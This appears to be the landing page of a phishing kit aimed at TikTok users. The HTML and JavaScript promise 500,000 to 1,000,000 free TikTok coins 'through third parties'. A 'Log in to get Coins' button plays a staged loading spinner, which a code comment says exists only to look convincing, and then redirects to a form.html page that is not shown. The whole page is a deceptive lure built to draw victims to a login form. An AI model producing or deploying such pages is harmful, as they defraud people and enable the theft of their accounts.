<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Get Free Coins</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background: url('tt.jpeg') no-repeat center center fixed;
      background-size: cover;
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
      overflow-x: hidden;
    }

    .card-box {
      background: rgba(28, 28, 30, 0.9);
      border-radius: 16px;
      padding: 1rem;
      cursor: pointer;
      transition: 0.3s;
      text-align: center;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      position: relative;
    }
    .card-box:hover {
      background: rgba(44, 44, 46, 0.95);
      transform: translateY(-4px);
    }
    .card-box.active {
      border: 2px solid #ff004f;
      box-shadow: 0 0 15px #ff004f66;
    }

    .coin-title {
      font-size: 0.9rem;
      margin-top: 5px;
      color: #ddd;
    }

    .coin-img {
      width: 40px;
      height: 40px;
      margin-top: 8px;
      animation: float 2s ease-in-out infinite;
    }

    @keyframes float {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-5px); }
    }

    .hero-text {
      margin-bottom: 1.5rem;
    }
    .hero-text h2 {
      font-weight: bold;
      font-size: 1.7rem;
    }
    .hero-text p {
      font-size: 0.95rem;
      color: #ccc;
    }

    .coin-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
      gap: 1rem;
      margin-bottom: 1.5rem;
    }

    .login-btn {
      background: #ff004f;
      border: none;
      width: 100%;
      padding: 12px;
      border-radius: 8px;
      font-size: 1rem;
      font-weight: bold;
      color: #fff;
      transition: 0.3s;
    }
    .login-btn:hover {
      background: #e60046;
    }

    /* Loading overlay blur motion */
    .loading {
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.6);
      backdrop-filter: blur(8px);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      display: none;
      flex-direction: column;
      color: #fff;
      font-size: 1.2rem;
    }
    .spinner {
      width: 50px;
      height: 50px;
      border: 5px solid rgba(255,255,255,0.2);
      border-top: 5px solid #ff004f;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 15px;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>

  <div class="container text-center px-4">
    <div class="hero-text">
      <h2>Get Free Coins</h2>
      <p>Get Free TikTok Coins<br>Through Third Parties</p>
    </div>

    <div class="coin-grid">
      <div class="card-box" onclick="selectCoin(this)" data-coin="500000">
        <strong>500.000</strong>
        <div class="coin-title">Free Coin</div>
        <img src="koin.jpg" alt="Coin" class="coin-img">
      </div>
      <div class="card-box" onclick="selectCoin(this)" data-coin="600000">
        <strong>600.000</strong>
        <div class="coin-title">Free Coin</div>
        <img src="koin.jpg" alt="Coin" class="coin-img">
      </div>
      <div class="card-box" onclick="selectCoin(this)" data-coin="700000">
        <strong>700.000</strong>
        <div class="coin-title">Free Coin</div>
        <img src="koin.jpg" alt="Coin" class="coin-img">
      </div>
      <div class="card-box" onclick="selectCoin(this)" data-coin="800000">
        <strong>800.000</strong>
        <div class="coin-title">Free Coin</div>
        <img src="koin.jpg" alt="Coin" class="coin-img">
      </div>
      <div class="card-box" onclick="selectCoin(this)" data-coin="900000">
        <strong>900.000</strong>
        <div class="coin-title">Free Coin</div>
        <img src="koin.jpg" alt="Coin" class="coin-img">
      </div>
      <div class="card-box" onclick="selectCoin(this)" data-coin="1000000">
        <strong>1.000.000</strong>
        <div class="coin-title">Free Coin</div>
        <img src="koin.jpg" alt="Coin" class="coin-img">
      </div>
    </div>

    <button class="login-btn" onclick="goLogin()">Log in to get Coins</button>
  </div>

  <!-- Loading Blur -->
  <div class="loading" id="loading">
    <div class="spinner"></div>
    Redirecting...
  </div>

  <script>
    let selectedCoin = null;
    function selectCoin(element) {
      document.querySelectorAll('.card-box').forEach(el => el.classList.remove('active'));
      element.classList.add('active');
      selectedCoin = element.getAttribute('data-coin');
    }

    function goLogin() {
      if (!selectedCoin) {
        alert("Select Coins!");
        return;
      }
      document.getElementById('loading').style.display = 'flex';
      setTimeout(() => {
        window.location.href = "form.html?coin=" + selectedCoin;
      }, 1500); // delay biar keliatan loading motion
    }
  </script>

</body>
</html>
